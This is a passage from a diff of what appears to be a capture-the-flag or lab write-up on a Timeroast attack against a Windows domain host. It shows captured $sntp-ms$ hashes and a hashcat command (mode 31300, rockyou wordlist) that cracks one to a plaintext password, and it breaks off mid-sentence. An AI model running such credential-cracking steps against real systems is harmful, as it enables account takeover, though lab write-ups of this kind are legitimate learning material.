@@ -171,3 +171,14 @@ TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1117:$sntp-ms$50cf909c28a660
 
 Ill place all these in a file and try to crack them with hashcat
 
+After a quick google search i find the hashcat mode to be 31300
+
+```python
+hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt
+
+...[SNIP]...
+
+$sntp-ms$bdcab56c7ea8caf83df9e6562e7fee9c$1c0111e900000000000a09324c4f434cee11f97684146f22e1b8428bffbfcd0aee1205969be30a25ee1205969be34839:P@ssw0rd!
+```
+
+This doesnt not tell me which user t
